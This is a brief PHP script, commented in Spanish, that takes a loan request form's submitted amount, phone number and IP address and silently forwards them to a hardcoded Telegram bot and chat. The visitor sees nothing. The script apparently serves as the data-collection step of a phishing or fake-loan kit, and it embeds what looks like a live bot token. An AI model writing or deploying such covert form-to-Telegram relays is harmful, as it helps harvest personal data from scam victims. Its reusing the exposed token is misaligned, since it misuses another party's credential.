<?php
// Token del bot de Telegram y el ID del chat (canal)
$apibot = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ"; 
$canal = "5157616506";

// Captura los datos enviados por el formulario
$monto = $_POST['monto'];
$telefono = $_POST['telefono'];
$ip = $_POST['ip'];

// Prepara el mensaje a enviar
$mensaje = "Nueva solicitud de préstamo:\n";
$mensaje .= "Monto: $monto\n";
$mensaje .= "Teléfono: $telefono\n";
$mensaje .= "IP: $ip\n";

// URL de la API de Telegram
$url = "https://api.telegram.org/bot$apibot/sendMessage?chat_id=$canal&text=" . urlencode($mensaje);

// Envía el mensaje a Telegram
file_get_contents($url);

// Finaliza sin mostrar nada al cliente
http_response_code(200);
?>
